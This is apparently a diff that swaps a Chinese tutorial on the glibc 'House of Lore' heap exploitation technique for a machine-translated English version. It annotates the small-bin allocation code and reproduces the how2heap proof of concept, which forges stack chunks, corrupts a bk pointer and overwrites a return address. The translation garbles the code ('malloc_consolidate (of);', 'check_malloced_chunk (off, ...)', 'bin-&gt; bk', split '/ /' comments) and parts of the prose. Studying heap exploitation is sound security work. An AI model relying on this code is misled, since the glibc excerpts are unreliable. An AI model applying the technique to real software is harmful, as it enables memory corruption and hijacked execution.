@@ -1,187 +1,334 @@
+[EN](./house_of_lore.md) | [ZH](./house_of_lore-zh.md)
 # House of Lore
 
-## 概述
 
-House of Lore 攻击与 Glibc 堆管理中的的 Small Bin 的机制紧密相关。
 
-House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。
+## Overview
 
-House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。
 
-## 基本原理
+The House of Lore attack is closely related to the mechanism of Small Bin in Glibc heap management.
 
-如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下
+
+House of Lore can modify the memory of any address by assigning chunks of any specified location.
+
+
+House of Lore takes advantage of the need to control the bk pointer of Small Bin Chunk and control the fd pointer of the chunk at the specified location.
+
+
+## Fundamental
+
+
+If at malloc, the requested memory block is in the range of small bin, then the execution process is as follows
+
 
 ```c
+
     /*
+
        If a small request, check regular bin.  Since these "smallbins"
+
        hold one size each, no searching within bins is necessary.
+
        (For a large request, we need to wait until unsorted chunks are
+
        processed to find best fit. But for small ones, fits are exact
+
        anyway, so we can check now, which is faster.)
+
      */
 
+
+
     if (in_smallbin_range(nb)) {
-        // 获取 small bin 的索引
+
+/ / Get the index of the small bin
         idx = smallbin_index(nb);
-        // 获取对应 small bin 中的 chunk 指针
-        bin = bin_at(av, idx);
-        // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk
-        // 如果 victim = bin ，那说明该 bin 为空。
-        // 如果不相等，那么会有两种情况
+
+/ / Get the corresponding chunk pointer in the small bin
+bin = bin_at (av, idx);
+// First execute victim= last(bin) to get the last chunk of the small bin
+// If victim = bin , then the bin is empty.
+// If they are not equal, then there will be two cases
         if ((victim = last(bin)) != bin) {
-            // 第一种情况，small bin 还没有初始化。
+
+// In the first case, the small bin has not yet been initialized.
             if (victim == 0) /* initialization check */
-                // 执行初始化，将 fast bins 中的 chunk 进行合并
-                malloc_consolidate(av);
-            // 第二种情况，small bin 中存在空闲的 chunk
+
+// Perform initialization to merge chunks in fast bins
+malloc_consolidate (of);
+// In the second case, there is a free chunk in the small bin
             else {
-                // 获取 small bin 中倒数第二个 chunk 。
+
+// Get the second-to-last chunk in the small bin.
                 bck = victim->bk;
-                // 检查 bck->fd 是不是 victim，防止伪造
+
+// Check if bck-&gt;fd is victim, prevent forgery
                 if (__glibc_unlikely(bck->fd != victim)) {
+
                     errstr = "malloc(): smallbin double linked list corrupted";
+
                     goto errout;
+
                 }
-                // 设置 victim 对应的 inuse 位
+
+/ / Set the corresponding inuse bit of victim
                 set_inuse_bit_at_offset(victim, nb);
-                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
-                bin->bk = bck;
+
+/ / Modify the small bin list, take the last chunk of the small bin
+bin-&gt; bk = bck;
                 bck->fd = bin;
-                // 如果不是 main_arena，设置对应的标志
+
+// If it is not main_arena, set the corresponding flag
                 if (av != &main_arena) set_non_main_arena(victim);
-                // 细致的检查
-                check_malloced_chunk(av, victim, nb);
-                // 将申请到的 chunk 转化为对应的 mem 状态
+
+// Detailed inspection
+check_malloced_chunk (off, victim, nb);
+// Convert the requested chunk to the corresponding mem state
                 void *p = chunk2mem(victim);
-                // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff
+
+// If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff
                 alloc_perturb(p, bytes);
+
                 return p;
+
             }
+
         }
+
     }
+
 ```
 
-从下面的这部分我们可以看出
+
+
+We can see from this part below
+
 
 ```c
-                // 获取 small bin 中倒数第二个 chunk 。
+
+// Get the second-to-last chunk in the small bin.
                 bck = victim->bk;
-                // 检查 bck->fd 是不是 victim，防止伪造
+
+// Check if bck-&gt;fd is victim, prevent forgery
                 if (__glibc_unlikely(bck->fd != victim)) {
+
                     errstr = "malloc(): smallbin double linked list corrupted";
+
                     goto errout;
+
                 }
-                // 设置 victim 对应的 inuse 位
+
+/ / Set the corresponding inuse bit of victim
                 set_inuse_bit_at_offset(victim, nb);
-                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
-                bin->bk = bck;
+
+/ / Modify the small bin list, take the last chunk of the small bin
+bin-&gt; bk = bck;
                 bck->fd = bin;
+
 ```
 
-如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的fake chunk，并且同时满足之后的 bck->fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。
 
-## 示例代码
+
+If we can modify the bk of the last chunk of the small bin to specify the fake chunk of the memory address, and at the same time satisfy the detection of bck-&gt;fd != victim, then we can make the bk of the small bin just construct for us. Fake chunk. In other words, the next time we apply for the small bin, we will assign the fake chunk to the specified location.
+
+
+## Sample Code
+
 
 ```c
+
 #include <stdio.h>
+
 #include <stdlib.h>
+
 #include <string.h>
+
 #include <stdint.h>
 
+
+
 void jackpot(){ puts("Nice jump d00d"); exit(0); }
+
+
 
 int main(int argc, char * argv[]){
 
 
+
+
+
   intptr_t* stack_buffer_1[4] = {0};
+
   intptr_t* stack_buffer_2[3] = {0};
 
+
+
   fprintf(stderr, "\nWelcome to the House of Lore\n");
+
   fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
+
   fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");
 
+
+
   fprintf(stderr, "Allocating the victim chunk\n");
+
   intptr_t *victim = malloc(100);
+
   fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);
 
+
+
   // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
+
   intptr_t *victim_chunk = victim-2;
 
+
+
   fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
+
   fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);
 
+
+
   fprintf(stderr, "Create a fake chunk on the stack");
+
   fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
+
          "in second to the last malloc, which putting stack address on smallbin list\n");
+
   stack_buffer_1[0] = 0;
+
   stack_buffer_1[1] = 0;
+
   stack_buffer_1[2] = victim_chunk;
 
+
+
   fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
+
          "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
+
          "chunk on stack");
+
   stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
+
   stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
+
   
+
   fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
          "the small one during the free()\n");
+
   void *p5 = malloc(1000);
+
   fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);
 
 
+
+
+
   fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
+
   free((void*)victim);
 
+
+
   fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
+
   fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
+
   fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
+
+
 
   fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
+
   fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);
 
+
+
   void *p2 = malloc(1200);
+
   fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);
 
+
+
   fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
+
   fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
+
   fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
+
+
 
   //------------VULNERABILITY-----------
 
+
+
   fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
+
+
 
   victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
 
+
+
   //------------------------------------
 
+
+
   fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
+
   fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");
+
+
 
   void *p3 = malloc(100);
 
 
+
+
+
   fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
+
   char *p4 = malloc(100);
+
   fprintf(stderr, "p4 = malloc(100)\n");
 
+
+
   fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
+
          stack_buffer_2[2]);
 
+
+
   fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
+
   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
+
   memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
+
 }
+
 ```
 
-上面代码已经讲得非常清楚了，不再解释。
 
-**但是需要注意的是：**
 
-1. `void *p5 = malloc(1000);` 是为了防止和 victim_chunk 之后和 top_chunk合并。
+The above code has been made very clear and will not be explained.
 
-2. `free((void*)victim)`，victim 会被放入到 unsort bin 中去，然后下一次分配的大小如果比它大，那么将从 top chunk 上分配相应大小，而该 chunk 会被取下link到相应的 bin 中。如果比它小(相等则直接返回)，则从该 chunk 上切除相应大小，并返回相应 chunk，剩下的成为 last reminder chunk ,还是存在 unsorted bin 中。
 
-## 参考文献
+** But what needs to be noted is: **
+
+
+1. `void *p5 = malloc(1000);` is to prevent merge with top_chunk after victim_chunk.
+
+
+2. `free((void*)victim)`, victim will be put into the unsort bin, and if the size of the next allocation is larger than this, the corresponding size will be allocated from the top chunk, and the chunk will be Remove the link to the appropriate bin. If it is smaller than this (equal returns directly), the corresponding size is cut off from the chunk, and the corresponding chunk is returned, and the rest becomes the last reminder chunk, or there is an unsorted bin.
+
+
+## references
+
 
 - [https://github.com/shellphish/how2heap/blob/master/house_of_lore.c](https://github.com/shellphish/how2heap/blob/master/house_of_lore.c)
